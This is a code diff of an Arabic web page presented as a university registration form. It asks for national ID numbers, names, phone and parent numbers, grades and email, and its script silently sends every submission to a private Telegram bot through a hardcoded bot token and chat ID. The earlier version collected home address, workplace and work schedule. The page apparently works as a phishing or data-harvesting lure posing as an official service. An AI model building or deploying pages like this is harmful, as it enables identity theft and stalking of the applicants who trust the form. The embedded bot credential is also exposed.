@@ -1,35 +1,219 @@
-<script>
-    document.getElementById('universityForm').addEventListener('submit', function(e) {
-        e.preventDefault();
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>نظام التسجيل الجامعي</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            margin: 0;
+            padding: 20px;
+            min-height: 100vh;
+        }
+        .container {
+            max-width: 500px;
+            margin: 0 auto;
+            background: white;
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+            text-align: right;
+        }
+        h2 {
+            color: #333;
+            text-align: center;
+            margin-bottom: 30px;
+            border-bottom: 2px solid #4CAF50;
+            padding-bottom: 10px;
+        }
+        .form-group {
+            margin-bottom: 20px;
+        }
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #333;
+            font-weight: bold;
+        }
+        input {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            font-size: 16px;
+            box-sizing: border-box;
+            transition: border-color 0.3s;
+        }
+        input:focus {
+            outline: none;
+            border-color: #4CAF50;
+        }
+        .submit-btn {
+            background: linear-gradient(135deg, #4CAF50, #45a049);
+            color: white;
+            padding: 15px;
+            border: none;
+            border-radius: 8px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;
+            transition: transform 0.2s;
+        }
+        .submit-btn:hover {
+            transform: translateY(-2px);
+        }
+        .warning {
+            text-align: center;
+            color: #ff4d4d;
+            font-weight: bold;
+            margin: 20px 0;
+            padding: 10px;
+            background: #ffe6e6;
+            border-radius: 5px;
+        }
+        .success {
+            background: #d4edda;
+            color: #155724;
+            padding: 15px;
+            border-radius: 8px;
+            margin-top: 20px;
+            text-align: center;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>🎓 البيانات المطلوبة في التقديم</h2>
         
-        const formData = new FormData(this);
-        const data = Object.fromEntries(formData.entries());
-        
-        const message = `
-🎓 **تسجيل جامعي جديد**
+        <form id="universityForm">
+            <div class="form-group">
+                <label for="name_ar">الاسم الكامل (عربي):</label>
+                <input type="text" id="name_ar" name="name_ar" required>
+            </div>
 
-👤 **الاسم الكامل:** ${data.fullName}
-📞 **رقم الجوال:** ${data.phone}
-🚨 **رقم احتياطي:** ${data.emergencyPhone}
-🏠 **العنوان:** ${data.address}
-📍 **موقع السكن:** ${data.residenceLocation}
-💼 **موقع الدوام:** ${data.workLocation}
-⏰ **أوقات الدوام:** ${data.workSchedule}
-🕒 **الوقت:** ${new Date().toLocaleString('ar-SA')}
-        `;
+            <div class="form-group">
+                <label for="name_en">الاسم الكامل (إنجليزي):</label>
+                <input type="text" id="name_en" name="name_en" required>
+            </div>
 
-        // استخدام XMLHttpRequest بدلاً من fetch
-        const xhr = new XMLHttpRequest();
-        const url = 'https://api.telegram.org/bot8457845780:AAEGCZOgCqnM3HG2lr0fRt_WCdrC5Z-A26I/sendMessage';
-        
-        xhr.open('POST', url, true);
-        xhr.setRequestHeader('Content-Type', 'application/json');
-        xhr.send(JSON.stringify({
-            chat_id: '7003054961',
-            text: message
-        }));
+            <div class="form-group">
+                <label for="id_number">رقم الهوية:</label>
+                <input type="text" id="id_number" name="id_number" required>
+            </div>
 
-        document.getElementById('successMessage').style.display = 'block';
-        this.reset();
-    });
-</script>
+            <div class="form-group">
+                <label for="phone">رقم الهاتف:</label>
+                <input type="tel" id="phone" name="phone" required>
+            </div>
+
+            <div class="form-group">
+                <label for="parent_num">رقم ولي الأمر:</label>
+                <input type="text" id="parent_num" name="parent_num">
+            </div>
+
+            <div class="form-group">
+                <label for="current_region">المنطقة الحالية:</label>
+                <input type="text" id="current_region" name="current_region">
+            </div>
+
+            <div class="form-group">
+                <label for="cert_type">صورة من الشهادة:</label>
+                <input type="text" id="cert_type" name="cert_type">
+            </div>
+            
+            <div class="form-group">
+                <label for="academic_num">الأكاديمي:</label>
+                <input type="text" id="academic_num" name="academic_num">
+            </div>
+
+            <div class="form-group">
+                <label for="major_name">اسم التخصص المطلوب:</label>
+                <input type="text" id="major_name" name="major_name">
+            </div>
+            
+            <div class="form-group">
+                <label for="gpa">المعدل التراكمي:</label>
+                <input type="text" id="gpa" name="gpa">
+            </div>
+
+            <div class="form-group">
+                <label for="grades">الدرجة: القدرات/والتحصيلي:</label>
+                <input type="text" id="grades" name="grades">
+            </div>
+
+            <div class="form-group">
+                <label for="email">البريد الإلكتروني (الايميل):</label>
+                <input type="email" id="email" name="email" required>
+            </div>
+
+            <div class="warning">
+                ⚠️ يرجى التأكد من صحة البيانات قبل إرسالها
+            </div>
+
+            <button type="submit" class="submit-btn">📤 إرسال البيانات</button>
+        </form>
+
+        <div id="successMessage" class="success">
+            <strong>✅ تم إرسال البيانات بنجاح!</strong>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('universityForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            // جمع البيانات من النموذج
+            const formData = new FormData(this);
+            const data = Object.fromEntries(formData.entries());
+            
+            // بناء الرسالة
+            const message = `
+🎓 **تسجيل جامعي جديد - بيانات كاملة**
+
+👤 **الاسم العربي:** ${data.name_ar}
+🔤 **الاسم الإنجليزي:** ${data.name_en}
+🆔 **رقم الهوية:** ${data.id_number}
+📞 **رقم الهاتف:** ${data.phone}
+👨‍👩‍👧 **رقم ولي الأمر:** ${data.parent_num || 'غير مدخل'}
+📍 **المنطقة الحالية:** ${data.current_region || 'غير مدخل'}
+📄 **نوع الشهادة:** ${data.cert_type || 'غير مدخل'}
+🎓 **الرقم الأكاديمي:** ${data.academic_num || 'غير مدخل'}
+📚 **التخصص المطلوب:** ${data.major_name || 'غير مدخل'}
+⭐ **المعدل التراكمي:** ${data.gpa || 'غير مدخل'}
+📊 **الدرجات:** ${data.grades || 'غير مدخل'}
+📧 **البريد الإلكتروني:** ${data.email}
+
+🕒 **وقت التسجيل:** ${new Date().toLocaleString('ar-SA')}
+🌐 **المصدر:** صفحة التسجيل الجامعي
+            `;
+            
+            // إرسال البيانات باستخدام XMLHttpRequest (يعمل على GitHub Pages)
+            const xhr = new XMLHttpRequest();
+            const botToken = '8457845780:AAEGCZOgCqnM3HG2lr0fRt_WCdrC5Z-A26I';
+            const chatId = '7003054961';
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            
+            xhr.open('POST', url, true);
+            xhr.setRequestHeader('Content-Type', 'application/json');
+            xhr.send(JSON.stringify({
+                chat_id: chatId,
+                text: message,
+                parse_mode: 'Markdown'
+            }));
+            
+            // إظهار رسالة النجاح
+            document.getElementById('successMessage').style.display = 'block';
+            
+            // إعادة تعيين النموذج بعد 3 ثواني
+            setTimeout(() => {
+                this.reset();
+                document.getElementById('successMessage').style.display = 'none';
+            }, 3000);
+        });
+    </script>
+</body>
+</html>
